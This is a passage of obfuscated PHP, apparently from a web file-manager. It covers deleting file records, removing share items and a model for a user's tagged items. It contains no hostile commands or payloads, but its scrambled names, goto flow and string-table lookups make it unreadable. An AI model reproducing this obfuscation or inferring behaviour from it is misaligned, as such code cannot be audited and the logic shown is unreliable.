$aÙñù‹µğõ[75] => $C…óéåº­º); Model($aÙñù‹µğõ[164])->where($cñáÍ‹–Š)->save($eÌ‘î¶Ê·í); goto BÔó¿–œ‹ô; A––í‡òä: $Dó§ÂÚ×Œ­ = $eËëÛá×ƒ[$aÙñù‹µğõ[75]]; $C…óéåº­º = $C”Õœ´šì . str_replace("\173\x69\157\x3a{$d¶—Šç¡†ƒ}\x7d\57", $aÙñù‹µğõ[33], $Dó§ÂÚ×Œ­); if (!IO::exist($Dó§ÂÚ×Œ­)) { $AÊ–ğŸÈ”õ[] = $eËëÛá×ƒ[$aÙñù‹µğõ[415]]; $BÔÆÒ¶¬Ã…->updateFileEnd($eËëÛá×ƒ[$aÙñù‹µğõ[28]], $eËëÛá×ƒ[$aÙñù‹µğõ[77]]); continue; } goto Bğè®¿ÃŞ; BÔó¿–œ‹ô: } $this->removeByFileID($AÊ–ğŸÈ”õ); goto c‡šñƒÆõ¤; f‹£¯Ö‰ÚŞ: $aÙñù‹µğõ =& $_SERVER[¼]; $cñáÍ‹–Š = array($aÙñù‹µğõ[735] => $d¶—Šç¡†ƒ); $c¦ÆßÊ«« = Model($aÙñù‹µğõ[418])->where($cñáÍ‹–Š)->count(); goto aÓ®ÁÀù©; eØİÛÃÜÃÇ: } public function progress($BÑ¢ÚÕ¿“ç) { return Task::get($_SERVER[¼][2327] . $BÑ¢ÚÕ¿“ç); } private function removeByFileID($bâæ„£ÔóÌ = array()) { goto dÉ¹‘Ç’¿; DÎ«¡áá–: foreach ($C†İ·¹‚¬× as $bí›èŒ¥Ù) { Model($dŞœÎ‚–ì÷[379])->removeNow($bí›èŒ¥Ù, !1); } goto C›äè™’†—; dÉ¹‘Ç’¿: $dŞœÎ‚–ì÷ =& $_SERVER[¼]; if (empty($bâæ„£ÔóÌ)) { return; } $fù‚êğØ†é = array($dŞœÎ‚–ì÷[415] => array($dŞœÎ‚–ì÷[7], $bâæ„£ÔóÌ)); goto D³‘Éóä¬; D³‘Éóä¬: $C†İ·¹‚¬× = Model($dŞœÎ‚–ì÷[1103])->where($fù‚êğØ†é)->field($dŞœÎ‚–ì÷[366])->select(); if (!$C†İ·¹‚¬×) { return; } $C†İ·¹‚¬× = array_to_keyvalue($C†İ·¹‚¬×, $dŞœÎ‚–ì÷[33], $dŞœÎ‚–ì÷[366]); goto DÎ«¡áá–; C›äè™’†—: } private function removeShareItems($AÀˆ•‹Îœ) { goto aÂ¸Òº²ôŸ; aÂ¸Òº²ôŸ: $AÜáÔ¬îñö =& $_SERVER[¼]; $cé’™ç±Œ… = "\173\x69\157\72{$AÀˆ•‹Îœ}\175\x2f"; $BÕä®½¿‘Ì = array($AÜáÔ¬îñö[366] => 0, $AÜáÔ¬îñö[1011] => array($AÜáÔ¬îñö[743], "{$cé’™ç±Œ…}\45")); goto C†¥ò‰Í‡Ì; EŒñ×«÷Ÿ: Model($AÜáÔ¬îñö[532])->remove($Eñ®ô¿¨); goto DâŒâ‘§Úç; C†¥ò‰Í‡Ì: $Fè‹ñ´¼„È = Model($AÜáÔ¬îñö[2044])->where($BÕä®½¿‘Ì)->field($AÜáÔ¬îñö[437])->select(); if (empty($Fè‹ñ´¼„È)) { return; } $Eñ®ô¿¨ = array_to_keyvalue($Fè‹ñ´¼„È, $AÜáÔ¬îñö[33], $AÜáÔ¬îñö[437]); goto EŒñ×«÷Ÿ; DâŒâ‘§Úç: } } goto E²ÒËº§‡¼; F§¤ïæÕ„‘: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\163\145\x72\137\x66\x61\x76"; protected function cacheFunctionAlias($fˆ‡ÁÀÁ¨¹) { $fÏÇÕŒ‚ê‘ =& $_SERVER[¼]; return array($fÏÇÕŒ‚ê‘[2438] => array(USER_ID, $fÏÇÕŒ‚ê‘[2495])); } protected function listData() { $A‹¦¡š±­© =& $_SERVER[¼]; $CéÒª­é ¾ = array($A‹¦¡š±­©[1395] => USER_ID, $A‹¦¡š±­©[432] => array($A‹¦¡š±­©[2496], 0)); $Dø¸‡ïÁæ£ = $A‹¦¡š±­©[2497]; $a¥åˆÅÎˆ = $A‹¦¡š±­©[2498]; $E»¾¸ùÀò¼ = $this->field($Dø¸‡ïÁæ£)->where($CéÒª­é ¾)->order($a¥åˆÅÎˆ)->select(); return $E»¾¸ùÀò¼ ? $E»¾¸ùÀò¼ : array(); } protected function listByTag($Cöšå‘Òğİ) { } protected function addToTag($e†Ì‰Ø¨ƒ, $D‚ø¶ôà‚) { $BõÛÈ‡¶‰’ =& $_SERVER[¼]; if (!Model($BõÛÈ‡¶‰’[2267])->listData($D‚ø¶ôà‚) || !Model($BõÛÈ‡¶‰’[744])->pathInfo($e†Ì‰Ø¨ƒ)) { return !1; } $aŠ«¤¨ŠËÎ = array($BõÛÈ‡¶‰’[1395] => USER_ID, $BõÛÈ‡¶‰’[432] => $D‚ø¶ôà‚, $BõÛÈ‡¶‰’[384] => $e†Ì‰Ø¨ƒ, $BõÛÈ‡¶‰’[385] => $BõÛÈ‡¶‰’[379], $BõÛÈ‡¶‰’[383] => $BõÛÈ‡¶‰’[33], $BõÛÈ‡¶‰’[2071] => 0); if ($this->where($aŠ«¤¨ŠËÎ)->find()) { return !1; } return $this->add($aŠ«¤¨ŠËÎ); } protected function removeFromTag($FôÑŒ˜ŞŠ§, $D¶¸«Ì¯‚±) { $D¬ôˆöàÎø =& $_SERVER[¼]; if (!Model($D¬ôˆöàÎø[2267])->listData($D¶¸«Ì¯‚±) || !Model($D¬ôˆöàÎø[744])->pathInfo($FôÑŒ˜ŞŠ§)) { return !1; } $DÉÍŠ÷ô˜õ = array($D¬ôˆöàÎø[1395] => USER_ID, $D¬ôˆöàÎø[432] => $D¶¸«Ì¯‚±, $D¬ôˆöàÎø[385] => $D¬ôˆöàÎø[379], $D¬ôˆöàÎø[384] => $FôÑŒ˜ŞŠ§); return $this->where($DÉÍŠ÷ô˜õ)->delete(); } protected function removeByTag($D­ÀÄŒ¬å) { $C«Òé†Œá =& $_SERVER[¼]; if (!$D­ÀÄŒ¬å) { return !1; } $d¦Š¶‘÷Öß = array($C«Òé†Œá[1395] => USER_ID, $C«Òé†Œá[432] => $D­ÀÄŒ¬å); return $this->where($d¦Š¶‘÷Öß)->delete(); } protected function removeBySource($DïÕÑ‹Ë÷) { $B¶¯ÌÒô¿† =& $_SERVER[¼]; $Dªå¯…†‹Û = array($B¶¯ÌÒô¿†[1395] => USER_ID, $B¶¯ÌÒô¿†[384] => $DïÕÑ‹Ë÷, $B¶¯ÌÒô¿†[432] => array($B¶¯ÌÒô¿†[923], 0)); return $this->where($Dªå¯…†‹Û)->delete(); } }